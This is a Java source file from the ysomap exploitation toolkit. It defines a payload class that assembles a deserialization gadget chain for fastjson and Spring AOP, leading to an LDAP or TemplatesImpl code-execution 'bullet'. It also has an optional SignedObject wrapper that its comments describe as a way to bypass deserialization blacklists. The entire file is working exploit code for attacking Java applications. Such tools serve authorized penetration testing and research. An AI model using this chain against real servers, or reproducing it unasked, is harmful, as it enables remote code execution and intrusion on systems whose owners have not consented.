package ysomap.payloads.java.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Objects;

/**
 * @author whocansee
 * @since 2023/10/7
 * 基本原理和BadAttributeValueExpExceptionWithJsonObject一致，只是将toString触发方式改成了SpringAOP里面的一条链（最先用于Hessian反序列化）
 * 需要目标具有Spring环境
 * 由于FastJson序列化逻辑中getter调用顺序的问题，在调用到getDatabaseMetaData()之前就会报错，因而不支持JdbcRowSetImplBullet
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"LdapAttributeBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"fastjson all versions & SpringAOP"})
@Details("基本原理和BadAttributeValueExpExceptionWithJsonObject一致，只是将toString触发方式改成了SpringAOP里面的一条链（最先用于Hessian反序列化）")
public class SpringAOPXStringWithJsonObject extends AbstractPayload<Object> {
    @Require(name = "wrapped", detail = "是否使用SignedObject进行二次反序列化（用以绕过反序列化黑名单）" +
            "默认不使用，填true表示启用")
    private Boolean wrapped = false;

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object obj1 = getterGadget(obj);
        if (wrapped) {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            kpg.initialize(1024);
            KeyPair kp = kpg.generateKeyPair();
            SignedObject signedObject = new SignedObject((Serializable) obj1, kp.getPrivate(), Signature.getInstance("DSA"));
            return PayloadHelper.makeReadObjectToStringTrigger(getterGadget(signedObject));
        } else {
            return PayloadHelper.makeReadObjectToStringTrigger(obj1);
        }
    }
    public static void setValue(Object obj,String field,Object value) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj,value);
    }
    public static Object getterGadget(Object obj) throws Exception {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("g","m");
        JSONObject jsonObject1 = new JSONObject();
        jsonObject1.put("g",obj);

        HotSwappableTargetSource v1 = new HotSwappableTargetSource(jsonObject);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("x"));

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(v1,v1);
        hashMap.put(v2,v2);
        setValue(v1,"target",jsonObject1);

        HashMap<Object,Object> hhhhashMap = new HashMap<>();
        hhhhashMap.put(obj,hashMap);
        return hhhhashMap;
    }
}